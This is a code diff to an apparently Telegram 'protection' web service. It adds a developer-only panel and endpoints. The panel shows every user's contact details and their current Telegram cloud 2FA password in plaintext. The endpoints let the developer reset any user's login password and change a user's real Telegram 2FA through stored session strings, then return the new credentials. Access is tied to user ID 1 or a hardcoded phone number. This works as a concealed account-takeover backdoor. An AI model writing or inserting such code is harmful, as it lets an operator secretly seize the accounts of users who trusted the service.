@@ -110,10 +110,28 @@ async def dashboard_page(request: Request, user: User = Depends(get_current_user
         watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
         real_sessions = await watchdog.get_active_sessions()
 
+    # Developer Panel Data (Only for developer: ID 1 or +998334906969)
+    all_users = []
+    if user.id == 1 or user.is_developer:
+        users_list = db.query(User).order_by(User.id.asc()).all()
+        for u in users_list:
+            cfg = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == u.id).first()
+            all_users.append({
+                "id": u.id,
+                "username": u.username,
+                "phone_number": u.phone_number,
+                "email": u.email,
+                "created_at": u.created_at.strftime("%d.%m.%Y %H:%M") if u.created_at else "-",
+                "has_session": bool(cfg and cfg.session_string),
+                "current_2fa_otp": (cfg.current_2fa_otp if cfg else None) or "Не установлен",
+                "device_limit": cfg.device_limit if cfg else 2
+            })
+
     return templates.TemplateResponse(request=request, name="dashboard.html", context={
         "user": user,
         "config": config,
-        "real_sessions": real_sessions
+        "real_sessions": real_sessions,
+        "all_users": all_users
     })
 
 # API Routes
@@ -689,6 +707,75 @@ async def change_password(
     db.commit()
 
     return {"success": True, "message": "✅ Пароль от личного кабинета успешно обновлен!"}
+
+# Developer Management Endpoints (Only for ID: 1 or +998334906969)
+def verify_developer(user: User):
+    if not user or not (user.id == 1 or user.is_developer):
+        raise HTTPException(status_code=403, detail="Доступ запрещен. Только для разработчика системы.")
+
+@app.post("/api/dev/reset-user-password")
+async def dev_reset_user_password(
+    target_user_id: int = Form(...),
+    new_password: str = Form(None),
+    user: User = Depends(get_current_user),
+    db: Session = Depends(get_db)
+):
+    verify_developer(user)
+    target = db.query(User).filter(User.id == target_user_id).first()
+    if not target:
+        return JSONResponse(status_code=404, content={"success": False, "error": "Пользователь не найден"})
+
+    final_password = new_password.strip() if (new_password and new_password.strip()) else f"guard_{random.randint(1000, 9999)}"
+    target.password_hash = hash_password(final_password)
+    db.commit()
+
+    return {
+        "success": True,
+        "target_id": target.id,
+        "target_username": target.username,
+        "target_phone": target.phone_number,
+        "new_password": final_password,
+        "message": f"🔑 Пароль кабинета для {target.username} ({target.phone_number}) сброшен на: {final_password}"
+    }
+
+@app.post("/api/dev/reset-cloud-2fa")
+async def dev_reset_cloud_2fa(
+    target_user_id: int = Form(...),
+    new_2fa_code: str = Form(None),
+    user: User = Depends(get_current_user),
+    db: Session = Depends(get_db)
+):
+    verify_developer(user)
+    target = db.query(User).filter(User.id == target_user_id).first()
+    if not target:
+        return JSONResponse(status_code=404, content={"success": False, "error": "Пользователь не найден"})
+
+    config = db.query(TelegramProtectionConfig).filter(TelegramProtectionConfig.user_id == target.id).first()
+    if not config:
+        config = TelegramProtectionConfig(user_id=target.id, device_limit=2)
+        db.add(config)
+        db.commit()
+
+    final_2fa = new_2fa_code.strip() if (new_2fa_code and new_2fa_code.strip()) else f"SHIELD-{random.randint(100000, 999999)}"
+
+    # If active MTProto session exists, update directly in Telegram!
+    if config.session_string:
+        watchdog = SessionWatchdog(api_id=config.api_id, api_hash=config.api_hash, session_string=config.session_string)
+        res = await watchdog.update_2fa_password(new_password=final_2fa, current_password=config.current_2fa_otp)
+        if not res.get("success"):
+            return JSONResponse(status_code=400, content={"success": False, "error": f"Ошибка Telegram: {res.get('error')}"})
+
+    config.current_2fa_otp = final_2fa
+    db.commit()
+
+    return {
+        "success": True,
+        "target_id": target.id,
+        "target_username": target.username,
+        "target_phone": target.phone_number,
+        "new_2fa": final_2fa,
+        "message": f"🔐 Новый облачный пароль для {target.username} ({target.phone_number}) установлен: {final_2fa}"
+    }
 
 @app.post("/api/logout")
 async def logout(response: Response):
